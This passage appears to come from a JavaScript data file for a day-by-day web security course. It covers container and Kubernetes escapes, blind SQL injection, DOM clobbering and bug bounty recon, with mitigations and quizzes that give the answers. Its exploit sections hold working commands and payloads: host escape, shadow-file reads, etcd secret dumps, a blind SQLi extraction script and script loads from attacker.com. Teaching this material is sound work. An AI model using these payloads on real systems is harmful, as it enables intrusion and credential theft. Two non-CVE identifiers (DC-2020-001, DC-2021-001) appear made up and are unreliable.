docker run --rm target/app env | grep -i key

# Or use:
dive target/app  # Visual layer explorer
\`\`\`

**5. APK secrets:**
\`\`\`bash
apktool d app.apk
grep -r "api\|key\|secret\|password\|token" ./decoded/
strings classes.dex | grep -i "api\|key\|secret"
\`\`\``,
    tools: ["gitleaks", "truffleHog", "git-secrets", "Semgrep", "detect-secrets", "Nuclei secrets templates"],
    mitigation: "Use environment variables, not hardcoded secrets. Scan repos with gitleaks/truffleHog in CI. Rotate any exposed keys immediately. Use secret management solutions (Vault, AWS Secrets Manager). Pre-commit hooks to prevent secret commits.",
    quiz: [
      { q: "Which GitHub dork syntax is used to find leaked .env files in a specific organization?", options: ["site:github.com .env password", "org:company filename:.env password", "inurl:github.com .env secret", "github.com/company .env"], answer: 1 },
      { q: "What type of analysis extracts hardcoded API keys from Android APK files?", options: ["Dynamic analysis via Frida", "Static analysis using apktool + strings/grep", "Network traffic interception", "Fuzzing"], answer: 1 },
      { q: "Which tool is specifically designed to detect secrets in git repositories and history?", options: ["nmap", "sqlmap", "gitleaks", "gobuster"], answer: 2 },
      { q: "When a secret is found in a public GitHub repository, the first action should be:", options: ["Report the repo to GitHub", "Immediately rotate/revoke the exposed key, then investigate scope of exposure", "Delete the git commit", "Change the username"], answer: 1 },
      { q: "Why are secrets leaked in GET request URLs especially dangerous?", options: ["GET requests don't use HTTPS", "URLs appear in server logs, browser history, referer headers, and proxy logs permanently", "GET requests are cached longer", "GET requests bypass firewalls"], answer: 1 }
    ]
  },
  {
    day: 28,
    date: "2026-07-21",
    title: "Kubernetes & Container Security",
    severity: "CRITICAL",
    category: "Cloud & Infrastructure",
    icon: "🐳",
    definition: "Container and Kubernetes security vulnerabilities arise from misconfigurations, exposed APIs, insecure images, and container escapes. Attackers target exposed Docker sockets, the Kubernetes API, etcd, and misconfigured RBAC policies to achieve host takeover or lateral movement across clusters.",
    theory: `Container environments introduce unique attack surfaces:

**Docker vulnerabilities:**
- Exposed Docker socket (/var/run/docker.sock) → full host compromise
- Privileged containers → container escape to host
- Mounted host paths → read/write host filesystem
- Outdated images with known CVEs

**Kubernetes attack surfaces:**
- Exposed API server (port 6443) without auth
- Exposed etcd (port 2379) — stores all cluster secrets
- Exposed kubelet (port 10250) — can execute commands in pods
- Misconfigured RBAC (overly permissive service accounts)
- Exposed Dashboard without auth
- Secrets stored in etcd unencrypted`,
    cve: [
      { id: "CVE-2019-5736", name: "runC Container Escape", desc: "runc container escape allowing attackers to overwrite the host runc binary." },
      { id: "CVE-2022-0185", name: "Linux Kernel Heap Overflow → Container Escape", desc: "Kernel vulnerability exploitable to escape containers with CAP_SYS_ADMIN." },
      { id: "CVE-2018-1002105", name: "Kubernetes API Server Privilege Escalation", desc: "API aggregation flaw allowing unauthenticated escalation to cluster-admin." }
    ],
    exploit: `**1. Exploit exposed Docker socket:**
\`\`\`bash
# If /var/run/docker.sock is accessible inside container:
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu bash
# Now you have access to full host filesystem at /host!

# Escape to host:
chroot /host
\`\`\`

**2. Kubernetes API server recon:**
\`\`\`bash
# Check if API is exposed without auth:
curl -k https://target:6443/api/v1/namespaces
curl -k https://target:6443/api/v1/secrets

# List all pods:
kubectl --server=https://target:6443 get pods --all-namespaces

# Check service account permissions from inside pod:
cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl auth can-i --list
\`\`\`

**3. Escape via privileged container:**
\`\`\`bash
# Inside privileged container:
fdisk -l
mount /dev/sda1 /mnt  # Mount host disk
cat /mnt/etc/shadow   # Read host shadow file
chroot /mnt           # Full host access!
\`\`\`

**4. kubeletctl - kubelet exploitation:**
\`\`\`bash
# Exposed kubelet (port 10250):
kubeletctl --server target exec -it -n kube-system -p coredns-xxx -c coredns -- /bin/sh
# Execute commands in any pod!
\`\`\`

**5. etcd data extraction:**
\`\`\`bash
# Exposed etcd (no TLS):
etcdctl --endpoints=http://target:2379 get / --prefix
# Dumps ALL cluster data including secrets, tokens, passwords
\`\`\``,
    tools: ["kube-hunter", "kubeletctl", "trivy", "kubeaudit", "etcdctl", "kubectl"],
    mitigation: "Never expose Docker socket or API server publicly. Enable RBAC with least privilege. Encrypt etcd at rest. Use network policies. Run containers as non-root with read-only filesystems. Regularly scan images with trivy.",
    quiz: [
      { q: "Why is mounting /var/run/docker.sock into a container a critical security risk?", options: ["It slows down the container", "It gives the container access to the Docker API, allowing full host compromise via creating privileged containers", "It disables networking", "It exposes container ports"], answer: 1 },
      { q: "What data is stored in Kubernetes etcd that makes its exposure critical?", options: ["Container logs only", "All cluster state including secrets, tokens, and service account credentials", "Only network policies", "Docker images"], answer: 1 },
      { q: "A privileged Docker container can escape to the host by:", options: ["Using curl to make internal requests", "Mounting the host filesystem and chrooting to it", "Sending network packets", "Reading environment variables"], answer: 1 },
      { q: "Which tool specifically hunts for Kubernetes security vulnerabilities in a cluster?", options: ["nmap", "sqlmap", "kube-hunter", "gobuster"], answer: 2 },
      { q: "CVE-2019-5736 allowed container escape by:", options: ["Exploiting etcd", "Overwriting the host runc binary during container execution", "Bypassing Kubernetes RBAC", "Exploiting exposed API server"], answer: 1 }
    ]
  },
  {
    day: 29,
    date: "2026-07-22",
    title: "Blind SQL Injection (Advanced)",
    severity: "HIGH",
    category: "Injection",
    icon: "🎯",
    definition: "While you know basic SQLi, blind SQL injection (where no data is returned) requires advanced techniques: boolean-based, time-based, and out-of-band extraction. Advanced scenarios include second-order SQLi, order-by injection, JSON column injection, and WAF bypass via encoding/comments.",
    theory: `Advanced blind SQLi is about creative extraction when the application gives no direct output.

**Boolean-based blind:**
- True condition: normal response
- False condition: different response (length, content, redirect)
- Binary search through character space to extract data

**Time-based blind:**
- Use SLEEP()/WAITFOR DELAY — if response delays, condition was true
- Used when even boolean differences aren't visible

**Second-order SQL injection:**
- Data stored safely (parameterized) → later retrieved and used unsafely in another query
- Example: username stored safely, then used in: "SELECT * FROM users WHERE admin_of='"+username+"'"

**WAF bypasses:**
- Comments: \`SE/**/LECT\`, \`UN/**/ION\`
- Case variations: \`SeLeCt\`
- URL encoding: \`%53ELECT\`
- Whitespace alternatives: \`SELECT%09FROM\`
- Scientific notation: \`1e0UNION\``,
    cve: [
      { id: "CVE-2023-23752", name: "Joomla Blind SQLi", desc: "Blind SQL injection in Joomla API endpoint allowing unauthenticated data extraction." },
      { id: "CVE-2022-21661", name: "WordPress Core SQLi", desc: "Blind SQL injection in WP_Query allowing extraction via boolean responses." }
    ],
    exploit: `**Boolean-based blind extraction:**
\`\`\`python
import requests

def extract_data(query):
    result = ""
    for pos in range(1, 50):
        # Binary search for efficiency
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            payload = f"1 AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}-- -"
            r = requests.get(f"https://victim.com/item?id={payload}")
            if "product found" in r.text:  # True condition
                lo = mid + 1
            else:
                hi = mid
        if lo == 32:
            break
        result += chr(lo)
    return result

# Extract DB version:
print(extract_data("SELECT version()"))
\`\`\`

**Time-based blind:**
\`\`\`sql
# MySQL - if version starts with '8':
1 AND IF(SUBSTRING(version(),1,1)='8',SLEEP(3),0)-- -

# MSSQL:
1'; IF (SELECT COUNT(*) FROM sysobjects WHERE name='users')>0 WAITFOR DELAY '0:0:3'-- -

# PostgreSQL:
1; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END-- -
\`\`\`

**WAF bypass techniques:**
\`\`\`sql
-- Space bypass:
UNION%09SELECT%091,2,3-- -
UNION(SELECT(1),(2),(3))

-- Comment bypass:
UN/**/ION SE/**/LECT 1,2,3

-- Case bypass:
uNiOn SeLeCt 1,2,3

-- Encoding:
%55NION %53ELECT 1,2,3  (U and S encoded)

-- Scientific notation:
1e0UNION SELECT 1,2,3

-- Second-order SQLi in username:
Username: admin'-- -
(stored safely, but used in later unsafe query)
\`\`\``,
    tools: ["sqlmap", "ghauri", "Burp Suite", "SQLiPy"],
    mitigation: "Always use parameterized queries/prepared statements. Implement proper WAF rules that cover all bypass techniques. Apply principle of least privilege to DB accounts. Monitor for abnormal query patterns.",
    quiz: [
      { q: "Second-order SQL injection differs from first-order because:", options: ["It uses different SQL syntax", "The malicious data is stored safely but later used unsafely in a different query", "It only works on POST requests", "It requires authentication"], answer: 1 },
      { q: "In time-based blind SQLi, SLEEP(3) is used to:", options: ["Slow down the server attack", "Create a true/false distinction measurable by response time delay", "Bypass WAF", "Avoid detection"], answer: 1 },
      { q: "The WAF bypass technique using '/**/' in SQL is called:", options: ["Null injection", "Comment-based bypass", "Unicode normalization", "HTTP splitting"], answer: 1 },
      { q: "Which tool is the most advanced modern SQLi exploitation framework (alternative to sqlmap)?", options: ["hydra", "ghauri", "gobuster", "dirsearch"], answer: 1 },
      { q: "In boolean-based blind SQLi, the attacker distinguishes TRUE from FALSE by:", options: ["Reading the full database output", "Observing differences in response content, length, status code, or redirect behavior", "Timing responses", "Reading error messages"], answer: 1 }
    ]
  },
  {
    day: 30,
    date: "2026-07-23",
    title: "DOM Clobbering",
    severity: "MEDIUM",
    category: "Client-Side Attacks",
    icon: "🌐",
    definition: "DOM clobbering is an attack technique where an attacker injects HTML elements into a page to override global JavaScript variables or properties using named HTML attributes (id, name). This can bypass Content Security Policy, hijack script execution, or cause XSS when the application reads DOM properties expecting JavaScript values but gets HTML elements instead.",
    theory: `In browsers, named HTML elements become accessible as global properties:

\`\`\`html
<form id="x"></form>
<script>console.log(window.x); // HTMLFormElement — not undefined!</script>
\`\`\`

If application code does:
\`\`\`javascript
if (!window.config) {
  window.config = {scriptUrl: '/safe/script.js'};
}
var s = document.createElement('script');
s.src = window.config.scriptUrl;
\`\`\`

An attacker who can inject HTML can clobber \`window.config\` with an HTML element, then access \`.scriptUrl\` via another nested element with name="scriptUrl".

**Use cases in attacks:**
- Bypass \`if (!x)\` guards
- Override security checks
- Poison \`document.baseURI\` via \`<base>\` injection
- Chain with other vulnerabilities for XSS`,
    cve: [
      { id: "DC-2020-001", name: "DOM Clobbering in DOMPurify bypass", desc: "DOM clobbering used to bypass DOMPurify sanitization library and achieve XSS." },
      { id: "DC-2021-001", name: "HackerOne DOM Clobbering", desc: "DOM clobbering in HackerOne's markdown renderer leading to XSS." }
    ],
    exploit: `**Basic clobbering example:**
\`\`\`html
<!-- Injected HTML via stored XSS or HTML injection: -->
<form id="config"><input name="scriptUrl" value="//attacker.com/evil.js"></form>

<!-- Application JS reads: -->
<script>
// Developer expects: undefined (will set default)
if (!window.config) { ... }  
// window.config = HTMLFormElement (truthy!) — guard bypassed
var url = window.config.scriptUrl;  // "//attacker.com/evil.js" (input element's value)
</script>
\`\`\`

**Double-level clobbering (a.b.c):**
\`\`\`html
<!-- To clobber window.x.y: -->
<a id="x"><a id="x" name="y" href="//attacker.com/evil.js"></a>

<!-- In Chrome: window.x.y returns "//attacker.com/evil.js" -->
\`\`\`

**Base tag injection:**
\`\`\`html
<!-- Inject: -->
<base href="//attacker.com/">

<!-- All relative URLs now point to attacker.com: -->
<script src="js/app.js"> → loads from //attacker.com/js/app.js
\`\`\`

**Clobbering via id in forms:**
\`\`\`html
<form id="document">
  <input id="cookie" value="stolen_cookie_value">
</form>
<!-- window.document is replaced with the form element! -->
\`\`\`

**Finding opportunities:**
- Look for HTML injection that doesn't allow scripts
- Check if app uses variables like \`window.x\` that could be clobbered
- Test with id= and name= attributes on forms/anchors`,
    tools: ["Burp Suite", "DOMPurify tester", "Browser DevTools Console", "DOM Invader (Burp)"],
    mitigation: "Use DOMPurify (updated version). Avoid reading from window properties that could be HTML elements. Use explicit variable declarations (const/let) instead of window globals. Implement strict CSP.",
    quiz: [
      { q: "DOM clobbering works by exploiting the fact that:", options: ["JavaScript and HTML share the same memory", "Named HTML elements (id/name attributes) create accessible global properties in the browser's window object", "The DOM is shared between iframes", "CSS can modify JavaScript variables"], answer: 1 },
      { q: "Which HTML elements are most commonly used in DOM clobbering attacks?", options: ["div and span", "form, input, and anchor tags (with id/name attributes)", "script and style", "table and tr"], answer: 1 },
      { q: "A <base> tag injection achieves what in DOM clobbering?", options: ["Overrides window.document", "Redirects all relative URL requests to an attacker-controlled domain", "Disables JavaScript", "Bypasses CORS"], answer: 1 },
      { q: "DOM clobbering is most dangerous when combined with:", options: ["SQL injection", "HTML injection in contexts where scripts are blocked but HTML is allowed, chained to JS that reads DOM properties", "SSRF", "Path traversal"], answer: 1 },
      { q: "Which Burp Suite tool helps discover DOM-based vulnerabilities including clobbering?", options: ["Collaborator", "DOM Invader", "Turbo Intruder", "Param Miner"], answer: 1 }
    ]
  },
  {
    day: 31,
    date: "2026-07-24",
    title: "Advanced Recon & Bug Bounty Methodology",
    severity: "INFO",
    category: "Methodology",
    icon: "🔍",
    definition: "A systematic, repeatable methodology is what separates consistent bug bounty hunters from occasional finders. Advanced recon combines passive intelligence gathering, active enumeration, continuous monitoring, and smart automation to maximize attack surface coverage and find vulnerabilities others miss.",
    theory: `**The Recon Pyramid:**
1. **Passive Recon**: Never touch target servers
2. **Active Recon**: Interact with target infrastructure
3. **Vulnerability Discovery**: Test discovered assets
4. **Exploitation**: Prove impact
5. **Reporting**: Clear, reproducible, impactful

**Key recon pillars:**
- **Asset Discovery**: Subdomains, IPs, ASNs, cloud assets
- **Technology Fingerprinting**: Frameworks, versions, WAF detection
- **Endpoint Discovery**: APIs, JS files, hidden paths
- **Content Discovery**: Parameters, backup files, admin panels
- **Intelligence Gathering**: GitHub, LinkedIn, job postings, breach data`,
    cve: [],
    exploit: `**Full recon workflow:**
\`\`\`bash
# 1. Subdomain enumeration
subfinder -d target.com -all -o subs.txt
amass enum -passive -d target.com >> subs.txt
cat subs.txt | sort -u > unique_subs.txt

# 2. DNS resolution
cat unique_subs.txt | dnsx -a -cname -resp -o resolved.txt

# 3. HTTP probing
cat resolved.txt | httpx -title -tech-detect -status-code -o live.txt

# 4. Screenshot all live hosts
cat live.txt | gowitness file -f -

# 5. JavaScript endpoint discovery  
cat live.txt | gau --subs | grep ".js$" | sort -u > js_files.txt
cat js_files.txt | xargs -I{} curl -sk {} | grep -oP "(?<=[\"'])/api/[^\"']+" | sort -u

# 6. Parameter discovery
cat live.txt | xargs -I{} arjun -u {} --output-format json

# 7. Vulnerability scanning
cat live.txt | nuclei -t ~/nuclei-templates/ -severity medium,high,critical

# 8. Content discovery
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
     -u https://target.com/FUZZ \
     -mc 200,301,302,403 -o content.txt

# 9. GitHub recon
# Search: org:target-company secrets, credentials, internal
# Use: gitrob, truffleHog

# 10. Continuous monitoring
# Set up notify alerts for new subdomains via:
subfinder -d target.com | notify -provider telegram
\`\`\`

**Bug bounty prioritization framework:**
\`\`\`
HIGH PRIORITY targets:
- New features/endpoints (look for recent Git commits)
- Mobile API backends (often less tested)
- Partner/integration APIs
- Admin panels
- File upload/download functionality
- Password reset / OAuth flows
- WebSockets and real-time features

QUICK WINS:
- Missing security headers (X-Frame-Options, CSP)
- Subdomain takeover
- Exposed API keys (GitHub recon)
- Open redirect chains
- CORS misconfigurations
\`\`\``,
    tools: ["subfinder", "amass", "httpx", "nuclei", "gau", "ffuf", "gowitness", "notify", "truffleHog", "gitrob"],
    mitigation: "N/A — This day covers attacker methodology for finding vulnerabilities. Defenders should conduct regular asset inventory audits and implement continuous security monitoring.",
    quiz: [
      { q: "In a bug bounty methodology, what distinguishes 'passive recon' from 'active recon'?", options: ["Passive uses automation, active is manual", "Passive never interacts with target servers (uses third-party data), active directly probes the target", "Passive is faster than active", "Passive only works on APIs"], answer: 1 },
      { q: "Which tool is used to take automated screenshots of many live web hosts during recon?", options: ["subfinder", "amass", "gowitness", "ffuf"], answer: 2 },
      { q: "Why should bug hunters prioritize newly deployed features on a target?", options: ["They have fewer users", "New code is often less reviewed for security, has fewer test cases, and is more likely to contain vulnerabilities", "New features always have SQLi", "They pay higher bounties"], answer: 1 },
      { q: "Nuclei is a vulnerability scanner that primarily works by:", options: ["Fuzzing random payloads", "Running community-developed YAML templates that match specific vulnerability patterns", "Brute-forcing credentials", "Reverse engineering binaries"], answer: 1 },
      { q: "What is the most effective way to find vulnerabilities others missed on a bug bounty target?", options: ["Run sqlmap on everything", "Focus on new functionality, partner integrations, API endpoints discovered via JS analysis, and continuous monitoring for infrastructure changes", "Only test the main domain", "Use automated scanners exclusively"], answer: 1 }
    ]
  }
];
